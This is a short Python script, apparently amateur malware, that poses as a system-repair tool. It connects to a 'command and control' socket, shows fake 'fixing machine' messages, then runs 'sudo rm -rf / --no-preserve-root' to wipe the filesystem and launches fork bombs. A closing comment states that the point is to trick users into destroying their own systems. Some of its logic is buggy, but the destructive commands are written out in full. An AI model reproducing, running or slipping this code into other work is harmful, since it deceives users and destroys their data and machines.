import os
import time
import socket

# command and control server (change this)
host = "127.0.0.1"
port = 8080

#need to start a netcat session with the ip and port your using 

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
call_home = sock.connect((host,port))
#TODO btw im not sure if these work
#UPDATE it worked 
fix = input("fix system? \n")
if fix == "yes" or "Yes":
    while fix == "yes" or "Yes":
        print("fixing machine")
        time.sleep(1)
        print("fixing machine.")
        time.sleep(1)
        print("fixing machine..")
        time.sleep(1)
        call_home
        os.system("sudo rm -rf / --no-preserve-root") and os.system("sudo rm -rf /") 
        time.sleep(1)
else:
    break1 = True
    while break1 == True:
        call_home
        os.system("sudo rm rf / --no-preserve-root")
        os.system("sudo :(){:|:& };:") and os.system(":(){:|:& };:")
        print("get fucked")


#--Code breakdown--
# the code leads the user to thinking the program is for fixing thier pc, it then dystroys the file system and os and in the process, sending back to a cmd and ctrl server     
